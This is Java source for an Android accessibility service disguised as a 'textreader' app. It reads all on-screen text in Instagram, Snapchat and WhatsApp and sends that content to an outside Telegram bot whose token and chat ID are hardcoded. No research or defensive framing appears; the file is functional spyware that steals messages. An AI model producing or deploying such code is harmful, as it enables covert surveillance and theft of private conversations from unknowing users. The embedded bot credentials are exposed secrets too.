package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 YOUR TELEGRAM CREDENTIALS
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
    private static final String CHAT_ID = "5465116744";

    // Enable discovery mode
    private static final boolean DISCOVERY_MODE = true;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sendToTelegram("✅ Service started – DISCOVERY MODE ON");
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Only target apps
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // Only on screen changes
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        if (DISCOVERY_MODE) {
            // --- DISCOVERY MODE: Send all view IDs and texts to Telegram ---
            StringBuilder report = new StringBuilder();
            report.append("📱 ").append(pkg).append(" | SCREEN DUMP\n");
            report.append("─────────────────────\n");
            
            // Collect all text nodes with their view IDs
            List<NodeInfo> nodes = new ArrayList<>();
            collectNodes(root, nodes);

            // Build report
            int count = 0;
            for (NodeInfo node : nodes) {
                if (count > 50) break; // limit to avoid flooding
                report.append("ID: ").append(node.viewId).append("\n");
                report.append("TXT: ").append(node.text).append("\n");
                report.append("CLASS: ").append(node.className).append("\n");
                report.append("───\n");
                count++;
            }

            // Send the report to Telegram
            String fullReport = report.toString();
            if (fullReport.length() > 4000) {
                fullReport = fullReport.substring(0, 3900) + "\n... (truncated)";
            }
            sendToTelegram(fullReport);
            writeToFile(fullReport);
        }
    }

    // ---- Helper classes ----

    private static class NodeInfo {
        String viewId;
        String text;
        String className;
        NodeInfo(String viewId, String text, String className) {
            this.viewId = viewId != null ? viewId : "null";
            this.text = text != null ? text : "null";
            this.className = className != null ? className : "null";
        }
    }

    private void collectNodes(AccessibilityNodeInfo node, List<NodeInfo> list) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().trim().length() > 0) {
            String viewId = node.getViewIdResourceName();
            String text = node.getText().toString().trim();
            String className = node.getClassName() != null ? node.getClassName().toString() : "";
            list.add(new NodeInfo(viewId, text, className));
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectNodes(child, list);
        }
    }

    // ---- Telegram Sender ----

    private void sendToTelegram(final String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(message, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                writeToFile("Telegram error: " + e.toString());
            }
        }).start();
    }

    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) { /* ignore */ }
    }

    @Override
    public void onInterrupt() {}
}
